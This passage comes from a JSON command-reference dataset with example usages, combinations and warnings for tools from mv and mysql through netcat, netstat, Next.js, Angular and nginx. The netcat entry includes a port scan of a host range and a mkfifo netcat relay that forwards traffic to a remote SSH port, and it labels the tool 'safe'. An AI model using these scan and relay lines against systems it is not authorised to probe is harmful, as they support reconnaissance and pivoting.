        "commands": "mkdir -p backup/$(date +%Y%m%d) && mv *.bak backup/$(date +%Y%m%d)/",
        "explanation": "Create dated backup directory and move backup files",
        "title": "mkdir && mv"
      },
      {
        "scenario": "Conditional move based on file existence",
        "commands": "[ -f oldfile.txt ] && mv oldfile.txt newfile.txt",
        "explanation": "Only rename file if it exists",
        "title": "&& mv"
      }
    ],
    "relatedCommands": [
      {
        "name": "cp",
        "relationship": "similar",
        "reason": "Use cp to copy instead of move when you need to keep original"
      },
      {
        "name": "rename",
        "relationship": "alternative",
        "reason": "More powerful for batch renaming with patterns"
      },
      {
        "name": "rsync",
        "relationship": "safer",
        "reason": "Use with --remove-source-files for safer move operations"
      }
    ],
    "warnings": [
      "mv overwrites destination files without warning",
      "Moving across filesystems actually copies then deletes",
      "Cannot undo mv operations - files are immediately moved"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/mv.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/mv.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/mv-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "mysql",
    "subtitle": "MySQL",
    "description": "MySQL command-line client for database operations",
    "examples": [
      "mysql -u username -p database_name  # Connect to MySQL database with username and password prompt",
      "mysql -u root -p < backup.sql  # Import SQL file into MySQL database",
      "mysqldump -u root -p database_name > backup.sql  # Export database to SQL file",
      "mysql -h server.com -u username -p database_name  # Connect to MySQL database on remote server",
      "mysql -u root -p -e 'SHOW DATABASES;'  # Run SQL query from command line",
      "mysql -u root -p -s -e 'SELECT COUNT(*) FROM users;'  # Execute query with minimal output formatting"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mysql [options] [database]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Database migration",
        "commands": "mysqldump -u root -p old_db > migration.sql && mysql -u root -p new_db < migration.sql",
        "explanation": "Export from old database and import to new database",
        "title": "mysqldump > migration && mysql < migration"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysqldump",
        "relationship": "combo",
        "reason": "mysqldump creates backups that mysql can restore"
      },
      {
        "name": "postgresql",
        "relationship": "alternative",
        "reason": "Alternative open-source database system"
      }
    ],
    "warnings": [
      "Password prompted interactively for security",
      "Default port is 3306",
      "Requires MySQL server to be running"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mysql_config_editor",
    "subtitle": "MySQL Configuration Editor",
    "description": "MySQL configuration utility for secure credential storage",
    "examples": [
      "mysql_config_editor set --login-path=client --host=localhost --user=root --password  # Store encrypted MySQL credentials for default client",
      "mysql_config_editor set --login-path=production --host=prod.server.com --user=appuser --password --port=3306  # Store credentials for production database access",
      "mysql_config_editor print --all  # Display all stored login paths (passwords are hidden)",
      "mysql_config_editor remove --login-path=production  # Delete stored login path configuration",
      "mysql_config_editor reset  # Remove all stored login path configurations",
      "mysql_config_editor set --login-path=backup --host=localhost --user=backup_user --password --socket=/tmp/mysql.sock  # Configure credentials for backup operations"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "mysql_config_editor [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Multi-environment setup",
        "commands": "mysql_config_editor set --login-path=dev --host=dev.db.com --user=devuser --password && mysql_config_editor set --login-path=staging --host=staging.db.com --user=staginguser --password",
        "explanation": "Configure separate credentials for development and staging",
        "title": "mysql_config_editor && mysql_config_editor"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Uses login paths created by mysql_config_editor"
      },
      {
        "name": "mysqldump",
        "relationship": "combo",
        "reason": "Can use login paths for secure backup operations"
      }
    ],
    "warnings": [
      "Login paths are stored in ~/.mylogin.cnf with encryption",
      "Passwords are encrypted but not salted",
      "File permissions should be restricted to owner only"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql-config-editor.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql-config-editor.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql-config-editor.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mysql_secure_installation",
    "subtitle": "MySQL Secure Installation",
    "description": "MySQL security configuration and hardening script",
    "examples": [
      "mysql_secure_installation  # Run interactive security hardening script",
      "mysql_secure_installation --use-default  # Apply security settings with default answers",
      "mysql_secure_installation -h remote.server.com -P 3306  # Secure MySQL server on remote host"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "mysql_secure_installation [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete MySQL setup",
        "commands": "systemctl start mysql && mysql_secure_installation && systemctl enable mysql",
        "explanation": "Start MySQL, secure it, then enable auto-start",
        "title": "systemctl && mysql_secure_installation && systemctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Used after securing to connect to MySQL"
      },
      {
        "name": "mysqladmin",
        "relationship": "combo",
        "reason": "Administrative tasks after security setup"
      }
    ],
    "warnings": [
      "Script modifies root password and removes test databases",
      "Should be run immediately after fresh MySQL installation",
      "Some steps may not apply to all MySQL versions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql-secure-installation.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql-secure-installation.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysql-secure-installation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mysqladmin",
    "subtitle": "MySQL Admin",
    "description": "MySQL server administration utility",
    "examples": [
      "mysqladmin -u root -p status  # Display MySQL server status information",
      "mysqladmin -u root -p processlist  # List active MySQL connections and queries",
      "mysqladmin -u root -p flush-privileges  # Reload grant tables after user changes",
      "mysqladmin -u root -p create newdatabase  # Create new MySQL database",
      "mysqladmin -u root -p drop olddatabase  # Delete MySQL database (with confirmation)",
      "mysqladmin -u root -p password 'newpassword'  # Change MySQL root user password",
      "mysqladmin -u root -p shutdown  # Gracefully shutdown MySQL server",
      "mysqladmin -u root -p kill 123  # Terminate specific MySQL process by ID"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "mysqladmin [options] command [command-options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Database maintenance routine",
        "commands": "mysqladmin -u root -p flush-logs && mysqladmin -u root -p flush-tables && mysqladmin -u root -p status",
        "explanation": "Flush logs and tables, then check status",
        "title": "mysqladmin && mysqladmin && mysqladmin"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Provides interactive access to MySQL"
      },
      {
        "name": "mysqldump",
        "relationship": "combo",
        "reason": "Often used together for backup operations"
      }
    ],
    "warnings": [
      "Some commands require SUPER privilege",
      "Drop database command asks for confirmation",
      "Process IDs change frequently, check processlist first"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mysqladmin extended-status",
    "subtitle": "MySQL Admin Extended Status",
    "description": "MySQL server status and performance monitoring command",
    "examples": [
      "mysqladmin -u root -p extended-status  # Display all MySQL server status variables",
      "mysqladmin -u root -p extended-status | grep -i innodb  # Show only InnoDB-related status variables",
      "mysqladmin -u root -p extended-status | grep -E 'Connections|Queries|Slow_queries|Uptime'  # Show key performance indicators",
      "mysqladmin -u root -p extended-status -i 5 -c 10  # Show status every 5 seconds for 10 iterations",
      "mysqladmin -u root -p extended-status | grep -i qcache  # Show query cache performance metrics",
      "mysqladmin -u root -p extended-status | grep -E 'Threads_|Max_used_connections'  # Monitor connection and thread usage"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mysqladmin [options] extended-status",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Performance monitoring dashboard",
        "commands": "mysqladmin -u root -p extended-status | grep -E 'Queries|Slow_queries|Connections|Threads_running' && mysqladmin -u root -p processlist",
        "explanation": "Show key metrics and active processes",
        "title": "mysqladmin | grep | Slow_queries | Connections | Threads_running && mysqladmin"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysqladmin processlist",
        "relationship": "combo",
        "reason": "Shows active MySQL processes and queries"
      },
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Can query INFORMATION_SCHEMA for similar data"
      }
    ],
    "warnings": [
      "Status variables are cumulative since server startup",
      "Some variables reset when server restarts",
      "Large numbers may indicate performance issues or high load"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqladmin.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mysqlcheck",
    "subtitle": "MySQL Check",
    "description": "MySQL table maintenance and repair utility",
    "examples": [
      "mysqlcheck -u root -p --all-databases  # Check all tables in all databases for errors",
      "mysqlcheck -u root -p --repair mydb mytable  # Repair corrupted table",
      "mysqlcheck -u root -p --optimize --all-databases  # Optimize all tables to reclaim space and improve performance",
      "mysqlcheck -u root -p --analyze mydb  # Update table statistics for query optimizer",
      "mysqlcheck -u root -p --auto-repair mydb  # Check tables and automatically repair if corrupted",
      "mysqlcheck -u root -p --check --extended mydb  # Perform thorough table integrity check",
      "mysqlcheck -u root -p --check --fast --all-databases  # Quick check of all tables for obvious problems"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mysqlcheck [options] [database] [table...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete maintenance routine",
        "commands": "mysqlcheck -u root -p --check --all-databases && mysqlcheck -u root -p --optimize --all-databases && mysqlcheck -u root -p --analyze --all-databases",
        "explanation": "Check, optimize, and analyze all databases",
        "title": "mysqlcheck && mysqlcheck && mysqlcheck"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysqladmin",
        "relationship": "combo",
        "reason": "Often used together for server maintenance"
      },
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Can run CHECK TABLE, REPAIR TABLE commands directly"
      }
    ],
    "warnings": [
      "OPTIMIZE TABLE rebuilds entire table and can be slow",
      "MyISAM tables are locked during repair operations",
      "InnoDB tables have different repair behaviors"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqlcheck.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqlcheck.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqlcheck.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "mysqldump",
    "subtitle": "MySQL Dump",
    "description": "MySQL database backup utility with advanced options",
    "examples": [
      "mysqldump -u root -p --single-transaction --routines --triggers mydb > backup.sql  # Backup database with procedures, functions, and triggers",
      "mysqldump -u root -p --all-databases --single-transaction > all_dbs.sql  # Backup all databases on server",
      "mysqldump -u root -p --no-data mydb > schema.sql  # Export only table structures without data",
      "mysqldump -u root -p --no-create-info mydb > data.sql  # Export only data without table structures",
      "mysqldump -u root -p mydb users orders > tables.sql  # Backup only specified tables",
      "mysqldump -h remote.server.com -u user -p mydb | gzip > remote_backup.sql.gz  # Backup remote database with compression",
      "mysqldump -u root -p --where='created_date > \"2023-01-01\"' mydb users  # Backup table data matching specific condition",
      "mysqldump -u root -p --hex-blob --single-transaction mydb > safe_backup.sql  # Export binary data in hex format for safety"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "mysqldump [options] [database] [table...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Production backup strategy",
        "commands": "mysqldump -u backup_user -p --single-transaction --flush-logs --master-data=2 --all-databases | gzip > backup_$(date +%Y%m%d).sql.gz",
        "explanation": "Create consistent backup with binary log position",
        "title": "mysqldump | gzip > backup_"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "Imports dumps created by mysqldump"
      },
      {
        "name": "mysqlbinlog",
        "relationship": "combo",
        "reason": "Works with binary logs for point-in-time recovery"
      }
    ],
    "warnings": [
      "--single-transaction ensures InnoDB consistency",
      "MyISAM tables may need --lock-tables for consistency",
      "Binary log coordinates captured with --master-data"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html"
      },
      {
        "platform": "macos",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html"
      },
      {
        "platform": "windows",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nagios",
    "subtitle": "Nagios Monitoring",
    "description": "Infrastructure monitoring system for networks, systems and applications",
    "examples": [
      "nagios /etc/nagios/nagios.cfg  # Start Nagios with configuration file",
      "nagios -v /etc/nagios/nagios.cfg  # Verify configuration file syntax",
      "nagios -V  # Display Nagios version information",
      "nagios -L  # Display Nagios license information"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "nagios [options] <config_file>",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Validate and start",
        "commands": "nagios -v /etc/nagios/nagios.cfg && nagios -d /etc/nagios/nagios.cfg",
        "explanation": "Verify config then start as daemon",
        "title": "nagios && nagios"
      }
    ],
    "relatedCommands": [
      {
        "name": "nagios-plugins",
        "relationship": "depends-on",
        "reason": "Nagios requires plugins for monitoring checks"
      },
      {
        "name": "zabbix",
        "relationship": "alternative",
        "reason": "Both provide infrastructure monitoring"
      }
    ],
    "warnings": [
      "Complex configuration file syntax",
      "Web interface requires separate Apache setup",
      "Plugins must be installed separately"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://nagios.org/documentation/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nano",
    "subtitle": "nano's another editor",
    "description": "Simple, user-friendly text editor",
    "examples": [
      "nano ~/.bashrc  # Open bash configuration for editing",
      "nano notes.txt  # Create and edit simple text file",
      "nano -l script.py  # Show line numbers while editing",
      "nano file1.txt file2.txt  # Edit multiple files, switch with Alt+> and Alt+<"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "nano [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Edit system file safely",
        "commands": "sudo cp /etc/hosts /etc/hosts.backup && sudo nano /etc/hosts",
        "explanation": "Backup system file before editing",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "vim",
        "relationship": "alternative",
        "reason": "More powerful but steeper learning curve"
      },
      {
        "name": "emacs",
        "relationship": "alternative",
        "reason": "Different text editor with more features"
      },
      {
        "name": "cat",
        "relationship": "combo",
        "reason": "View file contents before editing"
      }
    ],
    "warnings": [
      "Ctrl+X to exit, Y to save changes",
      "Some shortcuts displayed at bottom may conflict with terminal",
      "Limited features compared to vim/emacs"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/nano.1.html"
      },
      {
        "platform": "macos",
        "url": "https://www.nano-editor.org/docs.php"
      },
      {
        "platform": "generic",
        "url": "https://www.nano-editor.org/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or via package managers"
    }
  },
  {
    "name": "netcat",
    "subtitle": "Network Cat",
    "description": "Versatile networking utility for debugging and investigation",
    "examples": [
      "nc -zv google.com 80  # Test if port 80 is open on google.com",
      "nc -l 1234  # Listen on port 1234 for incoming connections",
      "nc localhost 1234  # Connect to server listening on localhost:1234",
      "nc -zv 192.168.1.100 1-100  # Scan ports 1-100 on target host",
      "nc -l 1234 < file.txt  # Serve file.txt on port 1234",
      "nc 192.168.1.100 1234 > received_file.txt  # Receive file from server and save locally",
      "nc -u -l 1234  # Listen for UDP connections on port 1234",
      "mkfifo backpipe && nc -l 9999 0<backpipe | nc target.com 22 1>backpipe  # Create SSH tunnel proxy for secure remote access"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "nc [options] [hostname] [port]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Quick file transfer",
        "commands": "nc -l 9999 < important.zip & nc target_host 9999 > important.zip",
        "explanation": "Transfer file between hosts using netcat",
        "title": "nc < important & nc > important"
      }
    ],
    "relatedCommands": [
      {
        "name": "telnet",
        "relationship": "similar",
        "reason": "Both can test network connectivity"
      },
      {
        "name": "socat",
        "relationship": "alternative",
        "reason": "More advanced networking swiss army knife"
      }
    ],
    "warnings": [
      "Some versions have different command-line options",
      "Be careful with listening servers on public interfaces",
      "No encryption - all data sent in plain text"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/nc.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/nc.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/nc.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "netplan",
    "subtitle": "Network Plan",
    "description": "Network configuration abstraction renderer for Ubuntu",
    "examples": [
      "sudo netplan apply  # Apply network configuration from YAML files",
      "sudo netplan try  # Try configuration with automatic rollback",
      "sudo netplan generate  # Generate backend configuration files",
      "netplan info  # Show available features and backends"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "netplan [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe configuration deployment",
        "commands": "sudo netplan generate && sudo netplan try && sudo netplan apply",
        "explanation": "Generate config, test safely, then apply permanently",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "nmcli",
        "relationship": "alternative",
        "reason": "Different network configuration approach"
      }
    ],
    "warnings": [
      "YAML syntax must be precise",
      "Ubuntu-specific tool"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://netplan.io/reference"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "netstat",
    "subtitle": "network statistics",
    "description": "Display network connections, routing tables, and network statistics",
    "examples": [
      "netstat -tulpn  # Display all TCP/UDP listening ports with process info",
      "netstat -tulpn | grep :8080  # Identify which process is listening on port 8080",
      "netstat -rn  # Show kernel routing table with numeric addresses",
      "netstat -i  # Display packet statistics for all network interfaces",
      "netstat -t  # Show only TCP protocol connections"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "netstat [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Monitor active connections continuously",
        "commands": "watch 'netstat -tulpn | head -20'",
        "explanation": "Continuously monitor network connections",
        "title": "watch | head"
      },
      {
        "scenario": "Find all processes listening on network",
        "commands": "netstat -tulpn | awk '/LISTEN/ {print $7}' | sort -u",
        "explanation": "List unique processes that have network listeners",
        "title": "netstat | awk | sort"
      }
    ],
    "relatedCommands": [
      {
        "name": "ss",
        "relationship": "alternative",
        "reason": "Modern replacement for netstat with better performance"
      },
      {
        "name": "lsof",
        "relationship": "similar",
        "reason": "Can also show network connections and listening ports"
      },
      {
        "name": "nmap",
        "relationship": "powerful",
        "reason": "Advanced network scanning and port detection"
      }
    ],
    "warnings": [
      "netstat is deprecated in favor of ss on modern Linux systems",
      "Process names require root privileges to display",
      "Output format varies between operating systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/netstat.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/netstat.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/net-tools/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "newman",
    "subtitle": "Newman",
    "description": "Command-line collection runner for Postman",
    "examples": [
      "newman run collection.json  # Execute all requests in Postman collection",
      "newman run collection.json -e environment.json  # Run collection with specific environment file",
      "newman run collection.json -r html  # Execute collection and generate HTML report",
      "newman run collection.json --folder 'User Management'  # Execute only requests in specified folder",
      "newman run collection.json --delay-request 1000  # Wait 1 second between each request",
      "newman run collection.json -d testdata.csv  # Iterate collection using data from CSV file",
      "newman run api-tests.json -e prod.json -d users.csv -r htmlextra,junit --timeout-request 30000 --timeout-script 10000 | tee newman-results.log && newman run smoke-tests.json -e prod.json -r cli,json --bail  # Complete CI/CD API testing pipeline with timeouts, multiple reports, and immediate failure on critical issues"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "newman run [options] <collection>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete API test suite",
        "commands": "newman run api-tests.json -e prod.json -d users.csv -r htmlextra,junit",
        "explanation": "Run API tests with environment, data, and multiple report formats",
        "title": "newman"
      }
    ],
    "relatedCommands": [
      {
        "name": "postman",
        "relationship": "combo",
        "reason": "Newman runs collections created in Postman"
      },
      {
        "name": "curl",
        "relationship": "similar",
        "reason": "Both make HTTP requests for API testing"
      }
    ],
    "warnings": [
      "Environment variables must be properly configured",
      "SSL/TLS issues may require --insecure flag",
      "Data file format must match collection variable names"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://learning.postman.com/docs/running-collections/using-newman-cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "newrelic",
    "subtitle": "New Relic Command Line Interface",
    "description": "New Relic CLI for application performance monitoring and observability",
    "examples": [
      "newrelic apm application list  # List all APM applications",
      "newrelic apm application get --name 'My App'  # Get details for specific application",
      "newrelic alerts policy create --name 'High CPU Policy'  # Create new alert policy",
      "newrelic apm deployment create --application-id 123 --revision v1.0.0  # Create deployment marker in APM",
      "newrelic nrql query --query 'SELECT * FROM Transaction LIMIT 10'  # Execute NRQL query",
      "newrelic apm deployment create --application-id $APP_ID --revision $(git rev-parse HEAD) --description \"$(git log -1 --pretty=format:'%s')\" --changelog \"$(git log --oneline -10)\" --user \"$(git config user.name)\" && newrelic nrql query --query \"SELECT rate(count(*), 1 minute) FROM Transaction WHERE appName = '$APP_NAME' SINCE 1 hour ago TIMESERIES\" | jq '.results[0].facets' > deployment-metrics.json  # Track deployment with git metadata and extract performance metrics for automated monitoring"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "newrelic [command] [subcommand] [flags]",
    "prerequisites": [
      "newrelic-account"
    ],
    "commandCombinations": [
      {
        "scenario": "Application health check",
        "commands": "newrelic apm application list && newrelic alerts policy list",
        "explanation": "Check applications and alert policies",
        "title": "newrelic && newrelic"
      }
    ],
    "relatedCommands": [
      {
        "name": "datadog",
        "relationship": "alternative",
        "reason": "Alternative APM and monitoring platform"
      },
      {
        "name": "dynatrace",
        "relationship": "alternative",
        "reason": "Alternative observability solution"
      }
    ],
    "warnings": [
      "Requires New Relic API key",
      "NRQL syntax is specific to New Relic",
      "Rate limiting on API requests"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.newrelic.com/docs/new-relic-cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "next",
    "subtitle": "Next.js CLI",
    "description": "Next.js React framework CLI for full-stack web applications",
    "examples": [
      "npx create-next-app@latest my-app  # Create new Next.js application with latest version",
      "next dev  # Start development server with hot reloading",
      "next build  # Create optimized production build",
      "next start  # Start production server after build",
      "next export  # Export app as static HTML files",
      "NODE_ENV=production next build && next export && npx serve out -l 8080 & sleep 5 && npx lighthouse http://localhost:8080 --output=json --output-path=./lighthouse-report.json --chrome-flags='--headless --no-sandbox' && kill %1 && cat lighthouse-report.json | jq '.categories.performance.score * 100'  # Production build with performance audit and automated Lighthouse scoring for deployment quality gates",
      "next lint  # Run ESLint on project files"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "npx next <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Build and start production",
        "commands": "next build && next start",
        "explanation": "Build optimized version and start production server",
        "title": "next && next"
      }
    ],
    "relatedCommands": [
      {
        "name": "react",
        "relationship": "underlying",
        "reason": "Next.js is built on React"
      },
      {
        "name": "vercel",
        "relationship": "combo",
        "reason": "Vercel provides optimal hosting for Next.js apps"
      }
    ],
    "warnings": [
      "Pages directory structure determines routing",
      "API routes run on server-side only",
      "Image optimization requires proper configuration"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://nextjs.org/docs/api-reference/cli"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ng",
    "subtitle": "Angular CLI",
    "description": "Angular CLI for creating and managing Angular applications",
    "examples": [
      "ng new my-app  # Generate new Angular application with default configuration",
      "ng serve  # Build and serve app on development server",
      "ng generate component user-list  # Create new component with HTML, CSS, and TypeScript files",
      "ng build --prod  # Build app for production with optimizations",
      "ng test  # Execute unit tests using Karma and Jasmine",
      "ng e2e  # Run end-to-end tests with Protractor",
      "ng build --configuration production --build-optimizer --vendor-chunk --common-chunk && ng test --browsers=ChromeHeadless --watch=false --code-coverage && ng lint && ng e2e --webdriver-update=false && npx bundlesize && echo 'Enterprise build pipeline completed: optimized production build, full test coverage, linting passed, e2e tests successful, bundle size validated'  # Complete enterprise Angular deployment pipeline with optimization, testing, quality gates"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ng <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Generate service and component",
        "commands": "ng generate service user && ng generate component user-detail",
        "explanation": "Create service for data logic and component for UI",
        "title": "ng && ng"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "Angular CLI is installed via npm"
      },
      {
        "name": "typescript",
        "relationship": "underlying",
        "reason": "Angular applications are built with TypeScript"
      }
    ],
    "warnings": [
      "Must be inside Angular workspace to run most commands",
      "Different Angular versions have different CLI commands",
      "Global CLI version should match project version"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://angular.io/cli"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nginx",
    "subtitle": "engine x",
    "description": "High-performance web server and reverse proxy",
    "examples": [
      "sudo nginx  # Start nginx with default configuration",
      "nginx -t  # Check nginx configuration files for syntax errors",
      "nginx -s reload  # Reload configuration without stopping server",
      "nginx -s quit  # Gracefully shutdown nginx server",
      "nginx -s stop  # Immediately stop nginx server",
      "nginx -c /path/to/nginx.conf  # Start nginx with specific configuration file",
      "nginx -v  # Display nginx version information",
      "nginx -t && sudo nginx -s reload && sleep 2 && for i in {1..5}; do curl -H 'Host: app$i.example.com' http://localhost/health -s -o /dev/null -w 'app$i: %{http_code} %{time_total}s\\n'; done && nginx -T | grep -E '(upstream|server_name)' | head -10  # Zero-downtime configuration reload with multi-domain health checks and upstream validation for production load balancing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "nginx [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Deploy configuration changes",
        "commands": "nginx -t && sudo nginx -s reload",
        "explanation": "Test config then reload if valid",
        "title": "nginx && sudo"
      },
      {
        "scenario": "Restart nginx service",
        "commands": "sudo nginx -s quit && sudo nginx",
        "explanation": "Stop then start nginx to apply major changes",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "apache2",
        "relationship": "alternative",
        "reason": "Apache HTTP Server alternative web server"
      },
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "Manage nginx as systemd service"
      },
      {
        "name": "curl",
        "relationship": "combo",
        "reason": "Test nginx configuration and responses"
      }
    ],
    "warnings": [
      "Configuration changes require reload to take effect",
      "Root permissions needed for binding to ports < 1024",
      "Log files can grow large without proper rotation"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://nginx.org/en/docs/"
      },
      {
        "platform": "macos",
        "url": "http://nginx.org/en/docs/"
      },
      {
        "platform": "windows",
